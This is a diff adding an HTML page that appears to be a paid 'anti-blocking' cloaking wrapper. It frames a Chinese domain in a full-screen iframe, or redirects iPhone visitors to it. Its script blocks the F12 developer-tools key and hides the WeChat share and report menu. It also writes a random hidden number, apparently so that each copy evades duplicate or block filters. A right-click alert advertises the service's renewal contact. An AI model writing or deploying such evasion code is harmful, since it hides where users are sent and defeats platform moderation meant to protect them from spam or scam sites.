@@ -1,0 +1,74 @@
+
+<!DOCTYPE html><html><head><base target="_parent"><meta http-equiv=Content-Type content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no,minimal-ui"><style type="text/css">*{margin: 0;padding: 0;}#clearfix{overflow: hidden;}html, body{height: 100%;}#clearfix{height: 100%;}#clearfix iframe{height: 100%;width: 100%;}#clearfix.ios{overflow-y: auto;-webkit-overflow-scrolling:touch !important;height: 100%;}#clearfix.ios iframe{height: 100%;min-width: 100%;width: 100px;*width: 100%;}</style><title></title></head><body><script type="text/javascript"> 
+  function malimalihong(url){
+  if(navigator.userAgent.match(/(iPod|iPhone|iPad)/)){
+          top.location.href=url;
+        }else{
+    var scrolling = 'yes';
+  }
+  var str ='<iframe src="' + url + '" id="url"  scrolling="' + scrolling + '" frameborder="0" ></iframe>';  
+  document.getElementById("clearfix").innerHTML+=str;
+}
+
+
+function click(e) {
+  if (document.all) {
+    if (event.button==2||event.button==3) { 
+      alert("防封已到期，网站上自助续费，此网站只提供防封服务 跟原网站没有任何关系！微信/QQ:1015808702");
+      //oncontextmenu='return false';
+    }
+  }
+  if (document.layers) {
+    if (e.which == 3) {
+      //oncontextmenu='return false';
+    }
+  }
+}
+
+
+if (document.layers) {
+  document.captureEvents(Event.MOUSEDOWN);
+}
+document.onmousedown=click;
+//document.oncontextmenu = new Function("return false;")
+document.onkeydown =document.onkeyup = document.onkeypress=function(){ 
+  if(window.event.keyCode == 123) { 
+    window.event.returnValue=false;
+    return(false); 
+  } 
+}
+
+  function onBridgeReady() {
+  WeixinJSBridge.call('hideOptionMenu');
+}
+
+if (typeof WeixinJSBridge == "undefined") {
+  if (document.addEventListener) {
+    
+  } else if (document.attachEvent) {
+    document.attachEvent('WeixinJSBridgeReady', onBridgeReady);
+    document.attachEvent('onWeixinJSBridgeReady', onBridgeReady);
+  }
+} else {
+  onBridgeReady();
+}
+</script>
+<div id="clearfix">
+</div>
+
+<script>
+
+var result2 = "http://dongpoqu.cn/";malimalihong(result2);
+</script>
+<div style="display:none;" style="color: #FFFFFF">  
+<script language='Javascript' >
+var rndnumb="";
+for (i=1;i<=16;i++){
+n = Math.floor(Math.random()*10);
+rndnumb= rndnumb + n;
+}
+document.write(rndnumb);
+</script>
+</div>
+</body>
+</html>
